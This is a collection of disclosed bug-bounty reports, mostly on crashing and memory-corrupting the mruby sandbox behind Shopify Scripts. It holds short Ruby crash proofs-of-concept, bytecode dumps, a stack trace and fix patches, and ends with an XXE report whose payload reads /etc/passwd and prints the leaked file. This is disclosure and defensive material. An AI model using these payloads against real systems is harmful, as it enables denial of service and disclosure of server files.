Removing `Range#initialize_copy` makes it possible to construct an uninitialized `Range` object. Calling (pretty much) any instance method on the uninitialized `Range` object afterwards causes mruby to dereference a null pointer, leading to a segfault.

I've attached a patch that fixes the bug by copying internal range state before calling `initialize_copy`, similar to what mruby already does for classes and modules.

---

### [Undefined method_missing null pointer dereference](https://hackerone.com/reports/181695)

- **Report ID:** `181695`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @h72
- **Bounty:** 8000 usd
- **Disclosed:** 2016-12-17T01:03:38.615Z
- **CVE(s):** -

**Vulnerability Information:**

It's possible to segfault mruby by undefining `BasicObject#method_missing` in certain cases.

There is a fallback method_missing C function (`mrb_method_missing`) which is called in _some_ cases when the VM fails to look up the `method_missing` method:

    > BasicObject.remove_method(:method_missing); 1.foo
    NoMethodError: undefined method 'foo' for 1

However the `mrb_method_missing` fallback is not consistently used.

`Kernel#__send__` calls into `mrb_funcall_with_block` in `vm.c`, which contains the following code at line 362 (as of commit 88604e39ac9c25ffdad2e3f03be26516fe866038):

        c = mrb_class(mrb, self);
        p = mrb_method_search_vm(mrb, &c, mid);
        if (!p) {
          undef = mid;
          mid = mrb_intern_lit(mrb, "method_missing");
          p = mrb_method_search_vm(mrb, &c, mid);
          n++; argc++;
        }

If the method search for `method_missing` fails, `p` will be a null pointer. Further down on line 380, `p` is tested with `MRB_PROC_CFUNC_P`, which deferences `p`.

This segfault can be reproduced with the following code:

    BasicObject.remove_method(:method_missing)
    1.__send__(:foo)

The method search logic in the `OP_SUPER` instruction is also buggy. The same bug can be triggered through `OP_SUPER` with the following code:

    BasicObject.remove_method(:method_missing)

    class A
      def foo
        super
      end
    end

    A.new.foo

I'm not familiar enough with the mruby VM internals to write a patch for this. It _should_ just be a matter of making sure `mrb_method_missing` is called if a `method_missing` method search fails (as the logic in `OP_SEND` instruction does).

---

### [Range constructor type confusion DoS](https://hackerone.com/reports/181910)

- **Report ID:** `181910`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @h72
- **Bounty:** 10000 usd
- **Disclosed:** 2016-12-17T01:03:07.728Z
- **CVE(s):** -

**Vulnerability Information:**

It's possible to crash mruby by redefining the `Range` class and then using the range literal syntax:

    Range = Array
    (1..2).inspect

The `mrb_range_new` function allocates and initializes a range object backed by the `RRange` struct, however it uses runtime constant lookup to find the `Range` class object. Redefining the `Range` constant to point to a different class and calling an instance method causes a segfault, as the `RRange::edges` field is confused for the `iv` field on other structs.

It may be possible to achieve RCE through this vulnerability, but there are significant complicating factors and I have not spent the time trying to develop an RCE PoC.

I have attached a patch which fixes this bug. My patch adds a `range_class` field to `mrb_state`, following the pattern other core classes use to avoid runtime constant lookups.

---

### [Null target_class DoS](https://hackerone.com/reports/183405)

- **Report ID:** `183405`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @h72
- **Bounty:** 8000 usd
- **Disclosed:** 2016-12-17T01:02:59.955Z
- **CVE(s):** -

**Vulnerability Information:**

The `Object#instance_exec` method in `mrbgems/mruby-object-ext/src/object.c` executes a block in the context of an object. It sets the VM's `target_class` pointer to the singleton class of this object. `target_class` is used as the definition target for constants and methods.

If a singleton class cannot be created for an object, `target_class` is set to `NULL`. The `OP_CLASS` and `OP_MODULE` opcodes in the VM assume `target_class` is not null when defining new classes and modules.

This causes a null pointer dereference and segfaults the mruby VM.

Sample code:

```
1.instance_exec { class X; end }
```

---

### [Segfault in mruby, mruby_engine and the parent MRI Ruby due to null pointer dereference](https://hackerone.com/reports/181828)

- **Report ID:** `181828`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @dkasak
- **Bounty:** 10000 usd
- **Disclosed:** 2016-12-16T21:42:33.468Z
- **CVE(s):** -

**Vulnerability Information:**

Introduction
============

Certain valid Ruby programs are able to cause a segmentation fault in mruby through a null pointer derefence, which in turn leads to a crash in mruby_engine and the parent MRI Ruby process.

Proof of concept
================

crash.rb:
---------

    def method
        yield
    end

    method(&a &&= 0)

1. Save the above code as crash.rb
2. Run either:
   a) mruby crash.rb
   b) sandbox crash.rb
3. Both cause a segmentation fault.

Discussion
==========

Everything below assumes the latest master of the mruby repository as of Nov 12th, which is commit `88604e39ac9c25ffdad2e3f03be26516fe866038`.

The null pointer dereference itself for the above POC happens in `ext/mruby_engine/mruby/src/vm.c`, line 1266:

        regs[0] = m->env->stack[0];

The `env` member of is a null pointer since `m` refers to a `RProc *` of a non-closure lambda.

The underlying cause of the bug is an unsafe peephole optimization during code generation which isn't a valid transformation in certain contexts. Let's examine the debug information generated by running `mruby -v crash.rb`:

    00001 NODE_SCOPE:
    00005   local variables:
    00005     a
    00001   NODE_BEGIN:
    00001     NODE_DEF:
    00003       method
    00002       NODE_BEGIN:
    00002         NODE_YIELD:
    00005     NODE_CALL:
    00005       NODE_SELF
    00005       method='method' (665)
    00005       args:
    00005       block:
    00005         NODE_BLOCK_ARG:
    00005           NODE_OP_ASGN:
    00005             lhs:
    00005               NODE_LVAR a
    00005             op='&&' (666)
    00005             NODE_INT 0 base 10
    irep 0x10d5920 nregs=4 nlocals=2 pools=0 syms=1 reps=1
    file: crash.rb
        1 000 OP_TCLASS R2
        1 001 OP_LAMBDA R3      I(+1)   1
        1 002 OP_METHOD R2      :method
        5 003 OP_LOADSELF       R2
        5 004 OP_JMPNOT R1      007
        5 005 OP_LOADI  R3      0
        5 006 OP_MOVE   R1      R3              ; R1:a
        5 007 OP_SENDB  R2      :method 0
        5 008 OP_STOP

    irep 0x10db740 nregs=3 nlocals=2 pools=0 syms=1 reps=0
    file: crash.rb
        1 000 OP_ENTER  0:0:0:0:0:0:0
        2 001 OP_BLKPUSH        R2      0:0:0:0
        2 002 OP_SEND   R2      :call   0
        2 003 OP_RETURN R2      return

From the above, it can be seen that R3 is set to a lambda representing the method `method` but then never re-set again in the true branch of the `JMPNOT`. Furthermore, the condition of `JMPNOT` will always be true in this particular case since `a` was never defined so the use of the &&= assignment operator causes it to be set to `nil`.

Since a method called through `SENDB A B C` expects the passed block to be located in the register A+C+1, which is R3 in the caller's context, it is obvious the method will instead receive the lambda representing `method` instead. Since lambdas are represented as `(RProc *)`, just as blocks are, this won't cause a type error. However, this particular lambda is not a closure so its `(RProc *)` doesn't contain an `env` member and it is a null pointer.

Note that the problem isn't limited to methods with blocks, as can be seen from this slightly modified example which also causes a segfault:

modified_crash.rb:
------------------

    def method(x)
        x.call
    end

    method(a &&= 0)

We then investigated further to check why the code generator was producing faulty bytecode, only to find that it in fact emits a correct `MOVE R3 R1` instruction immediately after the `LOADSELF`. However, since it is then followed by an appropriately "shaped" `JMPNOT`, it triggers the following peephole reduction rule which elides the `MOVE`:

    MOVE   R3   R1
    JMPNOT R3    0
    --------------
    JMPNOT R1    0

The rule in question is located in `ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c`, line 350. In another related example where the operation `a &&= 0` is done outside the argument list, the bytecode is almost exactly the same, just shuffled around. However, this shuffling prevents the `MOVE` and `JMPNOT` in being adjacent, which prevents the peephole rule from triggering and results in an ordinary mruby exception:

non_crash.rb:
-------------

    def method
        yield
    end

    a &&= 0

    method(&a)

This yields the following AST and bytecode:

    00001 NODE_SCOPE:
    00005   local variables:
    00005     a
    00001   NODE_BEGIN:
    00001     NODE_DEF:
    00003       method
    00002       NODE_BEGIN:
    00002         NODE_YIELD:
    00005     NODE_OP_ASGN:
    00005       lhs:
    00005         NODE_LVAR a
    00005       op='&&' (666)
    00005       NODE_INT 0 base 10
    00007     NODE_CALL:
    00007       NODE_SELF
    00007       method='method' (665)
    00007       args:
    00007       block:
    00007         NODE_BLOCK_ARG:
    00007           NODE_LVAR a
    irep 0x2468920 nregs=4 nlocals=2 pools=0 syms=1 reps=1
    file: a-new-kind-of-crash.7
        1 000 OP_TCLASS R2
        1 001 OP_LAMBDA R3      I(+1)   1
        1 002 OP_METHOD R2      :method
        5 003 OP_JMPNOT R1      005
        5 004 OP_LOADI  R1      0               ; R1:a
        7 005 OP_LOADSELF       R2
        7 006 OP_MOVE   R3      R1              ; R1:a   <<<the MOVE isn't elided>>>
        7 007 OP_SENDB  R2      :method 0
        7 008 OP_STOP

    irep 0x246e740 nregs=3 nlocals=2 pools=0 syms=1 reps=0
    file: a-new-kind-of-crash.7
        1 000 OP_ENTER  0:0:0:0:0:0:0
        2 001 OP_BLKPUSH        R2      0:0:0:0
        2 002 OP_SEND   R2      :call   0
        2 003 OP_RETURN R2      return

    trace:
            [1] a-new-kind-of-crash.7:2:in Object.method
            [0] a-new-kind-of-crash.7:7
    LocalJumpError: unexpected yield

Solution
========

We investigated several possible solutions, but ultimately the peephole optimization in question seems very precarious. As best as we could tell, the triggering factor seems to be an AST with a `NODE_OP_ASGN` nested inside a `NODE_CALL` (not necessarily as an immediate child). Since most of the work is done in the function `codegen` which is called recursively, there is no simple way to detect this special case without examining the AST. Therefore, presumably a flag should be set when the code generator enters a `NODE_CALL` so the peepholer knows not to make this optimization if inside it.

Since with our limited knowledge of the codebase it's not obvious that this is the right solution, we decided to simply disable the optimization for now since it is relatively low impact. We supply the following patch:

    diff --git a/mrbgems/mruby-compiler/core/codegen.c b/mrbgems/mruby-compiler/core/codegen.c
    index 9b064b8..6539ed4 100644
    --- a/mrbgems/mruby-compiler/core/codegen.c
    +++ b/mrbgems/mruby-compiler/core/codegen.c
    @@ -346,13 +346,6 @@ genop_peep(codegen_scope *s, mrb_code i, int val)
            }
        }
        break;
    -    case OP_JMPIF:
    -    case OP_JMPNOT:
    -      if (c0 == OP_MOVE && GETARG_A(i) == GETARG_A(i0)) {
    -        s->iseq[s->pc-1] = MKOP_AsBx(c1, GETARG_B(i0), GETARG_sBx(i));
    -        return s->pc-1;
    -      }
    -      break;
        default:
        break;
        }

With the optimization disabled, the segfault no longer happens and the code passes all tests. If the mruby developers insist that this optimization should remain, we are willing to work with them to develop a fix.

-- 
Denis Kasak
Damir Jelić

---

### [Segfault and/or potential unwanted (byte)code execution with "break" and "||=" inside a loop](https://hackerone.com/reports/183356)

- **Report ID:** `183356`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @dkasak
- **Bounty:** 10000 usd
- **Disclosed:** 2016-12-16T21:42:19.613Z
- **CVE(s):** -

**Vulnerability Information:**

Introduction
============

Certain invalid inputs (invalid Ruby programs) crash mruby and mruby_engine (including the parent MRI VM). The programs always involve the `||=` operator, loops and the `break` keyword.

Proof of Concept
================

crash.rb
--------

    A ||= break while break

1. Save the above code as crash.rb
2. Run either:
    a) mruby crash.rb
    b) sandbox crash.rb
3. Both cause a segmentation fault.

Discussion
==========

Everything below assumes the latest master of the mruby repository as of Nov 18th, which is commit `0ff3ae1fbaed62010c54c43235e29cdc85da2f78`.

The above crashing example isn't the only one that we've managed to produce but is the minimal one so far. An infinite family of programs is able to exploit this bug to crash the interpreter, execute spurious bytecode that wasn't generated for the current program or even set the machine instruction pointer to some junk value (making this a limited form of unwated code execution, even though the executed code isn't arbitrary).

The generated AST and bytecode for the crashing case is as follows:

    mruby 1.2.0 (2015-11-17)
    00001 NODE_SCOPE:
    00001   NODE_BEGIN:
    00001     NODE_WHILE:
    00001       cond:
    00001         NODE_BREAK:
    00001       body:
    00001         NODE_OP_ASGN:
    00001           lhs:
    00001             NODE_CONST A
    00001           op='||' (666)
    00001           NODE_BREAK:
    irep 0x16b2970 nregs=2 nlocals=1 pools=0 syms=1 reps=0
    file: crash.rb
        1 000 OP_JMP    010
        1 001 OP_ONERR  005
        1 002 OP_GETCONST       R1      :A
        1 003 OP_POPERR 1
        1 004 OP_JMP    007
        1 005 OP_RESCUE R1
        1 006 OP_LOADF  R1
        1 007 OP_JMPIF  R1      010
        1 008 OP_JMP    008
        1 009 OP_SETCONST       :A      R1
        1 010 OP_JMP    018
        1 011 OP_JMPIF  R1      001
        1 012 OP_LOADNIL        R1
        1 013 OP_STOP

The odd thing to notice here is that the `OP_JMP` at 010 jumps beyond the last instruction. This is what leads to a potential execution of spurious bytecode since there may be valid opcodes beyond the end of the `iseq` array of the current `irep` (and indeed, we've seen this happen).

Furthermore, the index of the instruction onto which the invalid `OP_JMP` jumps to is equal I + A where I is the index of the instruction the `OP_JMP` at 000 jumps to (in this case 010) and A is the index of an `OP_JMP` instruction located prior to the invalid one (so in this case 010 + 008 = 018). Since each additional `break` inserted into the code inserts an additional `OP_JMP` instruction, this implies that the argument of the invalid `OP_JMP` can be increased almost without bounds (limited only by memory consumption and/or the maximum argument to `OP_JMP` instructions, which is `0xffff >> 1` = 32767).

As an example, the code:

larger.rb
---------

    A ||= break break break break while break

Yields the following bytecode:

file: larger.rb
    1 000 OP_JMP        013
    1 001 OP_ONERR      005
    1 002 OP_GETCONST   R1      :A
    1 003 OP_POPERR     1
    1 004 OP_JMP        007
    1 005 OP_RESCUE     R1
    1 006 OP_LOADF      R1
    1 007 OP_JMPIF      R1      013
    1 008 OP_JMP        008
    1 009 OP_JMP        017
    1 010 OP_JMP        019
    1 011 OP_JMP        021
    1 012 OP_SETCONST   :A      R1
    1 013 OP_JMP        024
    1 014 OP_JMPIF      R1      001
    1 015 OP_LOADNIL    R1
    1 016 OP_STOP

After the jump is made, the memory location might contain a valid mruby instruction or even something with an opcode larger than the number of opcodes contained in the `optable` in `vm.c`. Since the code in `mrb_vm_exec` jumps to addresses contained in the `optable`, indexed by the opcode number, this leads to a limited form of unwanted code execution, since memory locations after the `optable` may contain pointers to executable code by accident.

It is interesting to note that a very similar program doesn't cause a crash:

non-crash.rb
------------

    a ||= break while break

The only difference from the crashing case is the use of a lowercase variable name instead of an uppercase (so a non-constant, in Ruby terms).

Another non-crashing case is the following:

non-crash-other.rb
------------------

    A &&= break while break

The only difference here is the use of another assignment operator — `&&`, instead of `||`.

This gives us a hint as to where the problem is. The invalid jump length is ultimately set during code generation for the `NODE_WHILE` node of the AST in `codegen.c`, line 1426. Specifically, the jump lengths are adjusted *after* the loop is generated, on line 1438 of the same file, during the call of the function `loop_pop()`.

When this function is executed in the debugger when run on the `crash.rb` case, it may be noticed that the `s->loop` variable, which contains the loop context, contains two loops inside one another instead of only one: a `LOOP_NORMAL` (which is generated by the `while`) and a `LOOP_RESCUE`. The latter is generated during code generation for `NODE_OP_ASGN`, starting at line 1724 of `codegen.c`. Here we encounter this interesting special case:

      if ((len == 2 && name[0] == '|' && name[1] == '|') &&
          ((intptr_t)tree->car->car == NODE_CONST ||
           (intptr_t)tree->car->car == NODE_CVAR)) {

This explains why the problem only happens only when using the `||=` operator on Ruby constants. It is here that an additional `LOOP_RESCUE` loop context is created, and it is using this context that is used later on by `loop_pop`/`dispatch_linked` to generate the final arguments to the jump instructions.

Since this "loop" is generated simply to catch potential `NameError` exceptions generated when an unexisting constant is reference, it seems that this loop context shouldn't escape the generation of the code for the assignment operator.

Solution
========

Therefore, the solution we chose was to pop this loop context after the assignment code is generated. This makes the `loop_pop`/`dispatch_linked` function calls inside the `while` code generation operate on the loop context for the `while` loop instead and fixes the generated jump.

undef-constant-or-assign.patch
------------------------------
    diff --git a/mrbgems/mruby-compiler/core/codegen.c b/mrbgems/mruby-compiler/core/codegen.c
    index 9b064b8..bbe0f51 100644
    --- a/mrbgems/mruby-compiler/core/codegen.c
    +++ b/mrbgems/mruby-compiler/core/codegen.c
    @@ -1746,6 +1746,7 @@ codegen(codegen_scope *s, node *tree, int val)
            genop(s, MKOP_A(OP_RESCUE, exc));
            genop(s, MKOP_A(OP_LOADF, exc));
            dispatch(s, noexc);
    +        loop_pop(s, val);
        }
        else if ((intptr_t)tree->car->car == NODE_CALL) {
            node *n = tree->car->cdr;

With the above patch, we were unable to crash the VM through this bug nor generated any more jumps with invalid jump lengths. Furthermore, all tests pass successfully.

---

### [Type confusion in mrb_exc_set leading to memory corruption](https://hackerone.com/reports/185041)

- **Report ID:** `185041`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @raydot
- **Bounty:** - usd
- **Disclosed:** 2016-12-16T20:26:40.161Z
- **CVE(s):** -

**Vulnerability Information:**

Similar to #181871, but the bug is more general. The E_*_ERROR macros are not constants, so the exception types can be redefined to not be exceptions:

    #define E_NOTIMP_ERROR              (mrb_class_get(mrb, "NotImplementedError"))

This means that any code calling mrb_raise on an exception macro can instead get a non-exception object, leading to memory corruption and arbitrary code execution. This snippet causes a native crash in mruby-engine:

    NotImplementedError = String
    Module.constants # mrb_raise(mrb, E_NOTIMP_ERROR, "Module.constants not implemented");

This should be fixed by making mrb_exc_set check that it is an exception type. Attached is a patch to mruby to fix this problem.

---

### [Exception cause SIGABRT](https://hackerone.com/reports/180977)

- **Report ID:** `180977`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @isra17
- **Bounty:** - usd
- **Disclosed:** 2016-12-16T20:05:23.592Z
- **CVE(s):** -

**Vulnerability Information:**

Overriding the `to_s` method of an exception and raise it from a sandboxed mruby evaluation result in a `abort()` call from `mruby`. This results with the whole ruby process terminating.

Tested on [4cd4dfc855f0cce18b1ee2f318927c13edb20d14](https://github.com/Shopify/mruby-engine/tree/4cd4dfc855f0cce18b1ee2f318927c13edb20d14)

# POC

```
# poc.rb
class A < Exception
  def to_s
  end
end
raise A.new
```

`$ bin/sandbox poc.rb`

# Crash Stacktrace:
```
 Thread 1 (Thread 0x7fe2b0992700 (LWP 26764)):
 #0  0x00007fe2aff8e428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54
         resultvar = 0
         pid = 26764
         selftid = 26764
 #1  0x00007fe2aff9002a in __GI_abort () at abort.c:89
         save_stage = 2
         act = {__sigaction_handler = {sa_handler = 0x7fe2aadaf4e0, sa_sigaction = 0x7fe2aadaf4e0}, sa_mask = {__val = {140611505812704, 0, 140611505991664, 0, 140611527335906, 140611505812704, 140611527442253, 0, 0, 140611505812704, 140611505843808, 0, 0, 140611505812704, 140611505888960, 0}}, sa_flags = 0, sa_restorer = 0x7fe2aadb6e60}
         sigs = {__val = {32, 0 <repeats 15 times>}}
 #2  0x00007fe2ac234bbc in mrb_exc_raise (mrb=mrb@entry=0x7fe2aadaf4e0, exc=...) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/error.c:295
 No locals.
 #3  0x00007fe2ac234f66 in mrb_raisef (mrb=mrb@entry=0x7fe2aadaf4e0, c=0x7fe2aadb6920, fmt=fmt@entry=0x7fe2ac2a3888 "%S cannot be converted to %S by #%S") at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/error.c:371
         args = <error reading variable args (Attempt to dereference a generic pointer.)>
         mesg = <optimized out>
 #4  0x00007fe2ac24c784 in mrb_convert_type (mrb=mrb@entry=0x7fe2aadaf4e0, val=val@entry=..., type=type@entry=MRB_TT_STRING, tname=tname@entry=0x7fe2ac2a23d9 "String", method=method@entry=0x7fe2ac29fdba "to_s") at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/object.c:340
         v = <optimized out>
 #5  0x00007fe2ac23a3ae in mrb_str_to_str (mrb=mrb@entry=0x7fe2aadaf4e0, str=...) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/string.c:1016
         s = <optimized out>
 #6  0x00007fe2ac23d338 in mrb_string_value_cstr (mrb=0x7fe2aadaf4e0, ptr=ptr@entry=0x7ffefeff51e0) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/string.c:2222
         str = <optimized out>
         ps = <optimized out>
         len = <optimized out>
         p = <optimized out>
 #7  0x00007fe2ac21e4ba in me_mruby_engine_get_exception (self=self@entry=0x7fe2aadaf3e0) at ../../../../ext/mruby_engine/mruby_engine.c:106
         host_backtrace = 22683040
         backtrace = {value = {p = 0x7fe2aadb7370, {i_flag = 0, i = 70305752922552}, {sym_flag = 112, sym = 32738}, bp = 0x7fe2aadb7370, fp = 0x7fe2aadb7370, vp = 0x7fe2aadb7370}, w = 140611505845104}
         class_name_obj = {value = {p = 0x7fe2aadb7280, {i_flag = 0, i = 70305752922432}, {sym_flag = 128, sym = 32738}, bp = 0x7fe2aadb7280, fp = 0x7fe2aadb7280, vp = 0x7fe2aadb7280}, w = 140611505844864}
         class_name = 0x7fe2aadb7280
         message = {value = {p = 0x7fe2aadb7430, {i_flag = 0, i = 70305752922648}, {sym_flag = 48, sym = 32738}, bp = 0x7fe2aadb7430, fp = 0x7fe2aadb7430, vp = 0x7fe2aadb7430}, w = 140611505845296}
         err = <optimized out>
 #8  0x00007fe2ac21c04c in me_mruby_engine_eval (self=self@entry=0x7fe2aadaf3e0, proc=<optimized out>, err=err@entry=0x7ffefeff53d0) at ../../../../ext/mruby_engine/eval_monitored.c:227
         err_no = <optimized out>
         thread = 140611505809152
         ru_then = {ru_utime = {tv_sec = 0, tv_usec = 296000}, ru_stime = {tv_sec = 0, tv_usec = 20000}, {ru_maxrss = 27092, __ru_maxrss_word = 27092}, {ru_ixrss = 0, __ru_ixrss_word = 0}, {ru_idrss = 0, __ru_idrss_word = 0}, {ru_isrss = 0, __ru_isrss_word = 0}, {ru_minflt = 4523, __ru_minflt_word = 4523}, {ru_majflt = 0, __ru_majflt_word = 0}, {ru_nswap = 0, __ru_nswap_word = 0}, {ru_inblock = 0, __ru_inblock_word = 0}, {ru_oublock = 0, __ru_oublock_word = 0}, {ru_msgsnd = 0, __ru_msgsnd_word = 0}, {ru_msgrcv = 0, __ru_msgrcv_word = 0}, {ru_nsignals = 0, __ru_nsignals_word = 0}, {ru_nvcsw = 10, __ru_nvcsw_word = 10}, {ru_nivcsw = 30, __ru_nivcsw_word = 30}}
         ru_now = {ru_utime = {tv_sec = 0, tv_usec = 296000}, ru_stime = {tv_sec = 0, tv_usec = 20000}, {ru_maxrss = 27160, __ru_maxrss_word = 27160}, {ru_ixrss = 0, __ru_ixrss_word = 0}, {ru_idrss = 0, __ru_idrss_word = 0}, {ru_isrss = 0, __ru_isrss_word = 0}, {ru_minflt = 4525, __ru_minflt_word = 4525}, {ru_majflt = 0, __ru_majflt_word = 0}, {ru_nswap = 0, __ru_nswap_word = 0}, {ru_inblock = 0, __ru_inblock_word = 0}, {ru_oublock = 0, __ru_oublock_word = 0}, {ru_msgsnd = 0, __ru_msgsnd_word = 0}, {ru_msgrcv = 0, __ru_msgrcv_word = 0}, {ru_nsignals = 0, __ru_nsignals_word = 0}, {ru_nvcsw = 11, __ru_nvcsw_word = 11}, {ru_nivcsw = 30, __ru_nivcsw_word = 30}}
         bypass_ctx = <optimized out>
         cid = -214394
         wait_result = <optimized out>
 #9  0x00007fe2ac21cc61 in ext_mruby_engine_eval (rself=22683280, rpath=22683200, rsource=22683080) at ../../../../ext/mruby_engine/ext.c:199
         err = 8
         proc = <optimized out>
 #10 0x00007fe2b049a50b in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #11 0x00007fe2b04a84a3 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #12 0x00007fe2b04a94d3 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #13 0x00007fe2b049e269 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #14 0x00007fe2b04a3142 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #15 0x00007fe2b0389cfd in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #16 0x00007fe2b038b6fd in ruby_exec_node () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #17 0x00007fe2b038d83e in ruby_run_node () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #18 0x000000000040087b in ?? ()
 No symbol table info available.
 #19 0x00007fe2aff79830 in __libc_start_main (main=0x400830, argc=3, argv=0x7ffefeff5e38, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffefeff5e28) at ../csu/libc-start.c:291
         result = <optimized out>
         unwind_buf = {cancel_jmp_buf = {{jmp_buf = {0, -1400422201668288379, 4196480, 140733176569392, 0, 0, 1399860906120036485, 1393279154571296901}, mask_was_saved = 0}}, priv = {pad = {0x0, 0x0, 0x7ffefeff5e58, 0x7fe2b09c7168}, data = {prev = 0x0, cleanup = 0x0, canceltype = -16818600}}}
         not_first_call = <optimized out>
 #20 0x00000000004008a9 in _start ()
 No symbol table info available.
Title: ruby2.3 crashed with SIGABRT in mrb_exc_raise()
```

Cheers!

---

### [Password Forgot/Password Reset Request Bug](https://hackerone.com/reports/182267)

- **Report ID:** `182267`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Pushwoosh
- **Reporter:** @ameerpornillos
- **Bounty:** - usd
- **Disclosed:** 2016-11-16T06:47:10.692Z
- **CVE(s):** -

**Summary (team):**

Password Forgot/Password Reset Request Bug

---

### [[rev-app.informatica.com] - XXE](https://hackerone.com/reports/105434)

- **Report ID:** `105434`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Informatica
- **Reporter:** @yarbabin
- **Bounty:** - usd
- **Disclosed:** 2016-08-02T15:30:38.774Z
- **CVE(s):** -

**Vulnerability Information:**

1. Open file xxe.xlsx like zip-archive
2. Read file xxe.xlsx\xl\worksheets\sheet1.xml

In file I wrote XXE payload:
<!DOCTYPE foo [  <!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" >]>
Then, i went to https://rev-app.informatica.com and made new project and imported my XLSX-file

When it was impoted i see /etc/passwd file:
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin
ec2-user:x:500:500::/home/ec2-user:/bin/bash
scom:x:501:501::/home/scom:/bin/bash
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
nslcd:x:65:55:LDAP Client User:/:/sbin/nologin
dataprep:x:504:505::/home2/dataprep:/bin/bash
zabbix:x:498:506::/home/zabbix:/bin/bash

Video (private): https://youtu.be/612SgFdOrB0

---
